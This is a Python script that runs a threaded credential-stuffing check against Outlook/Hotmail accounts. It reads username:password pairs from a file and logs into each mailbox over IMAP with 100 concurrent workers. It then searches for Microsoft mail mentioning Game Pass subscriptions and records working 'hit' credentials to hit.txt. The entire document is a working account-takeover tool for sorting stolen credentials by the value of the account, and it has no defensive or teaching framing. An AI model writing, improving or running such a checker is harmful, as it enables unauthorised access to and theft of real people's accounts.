import imaplib
import email
from email.header import decode_header
from concurrent.futures import ThreadPoolExecutor
num = 0
print("Started search")
def search_inbox(username_password):
    try:
        global num
        username, password = username_password
        # Connect to the Hotmail server
        mail = imaplib.IMAP4_SSL("imap-mail.outlook.com")
        mail.login(username, password)

        # Select the inbox
        mail.select("inbox")

        # Search for emails with a specific criteria        
        sender = ""  # Replace "sender@example.com" with the sender's email address
        subject = ""  # Replace "your_subject" with the subject you want to search for
       # result, data = mail.search(None, f'SUBJECT "{subject}"')
        # no-reply@microsoft.com
        result, data = mail.search(None, 'FROM "microsoft-noreply@microsoft.com"')
        # print(data)
        for num in data[0].split():
            tmp, msg_data = mail.fetch(num, '(RFC822)')
            # print(f'Message: {num}\n')

            # Parse the email content
            raw_email = msg_data[0][1]
            msg = email.message_from_bytes(raw_email)

            # Get the "From" field
            # print()
            from_email = msg['Subject']
            if "Game Pass Core" in from_email or "Game Pass Ultimate" in from_email:
                print(f"{username}:{password}")
                print(from_email)
            # if "noreply" in from_email:
                # print(f"From: {from_email}")

        # result, data = mail.search(None, '(FROM "billing@microsoft.com" )')

 # You can adjust the search criteria here
        # print(data[0].split())
        num += 1
        # contains_empty_bytes = any(item == b'' for item in data)
        if data[0].split():
        	# print(f"\n{username}:{password}")
        	with open("hit.txt","a") as f:
        		f.write(f"{username}:{password}\n")
        # Process search results
        
    except Exception as e:
    	# print(e)
        pass
    finally:
        # Close the connection
        mail.logout()

# Function to read accounts from a file
def read_accounts_from_file(filename):
    accounts = []
    with open(filename, 'r') as file:
        for line in file:
            if line.strip():  # Check if line is not empty
                try:
                	username, password = line.strip().split(":")
                	accounts.append((username, password))
                except:
                        pass
    return accounts

# Read accounts from a text file
accounts = read_accounts_from_file("accounts.txt")

# Create a thread pool
with ThreadPoolExecutor(max_workers=100) as executor:  # Adjust max_workers as needed
    # Submit tasks for each account
    executor.map(search_inbox, accounts)
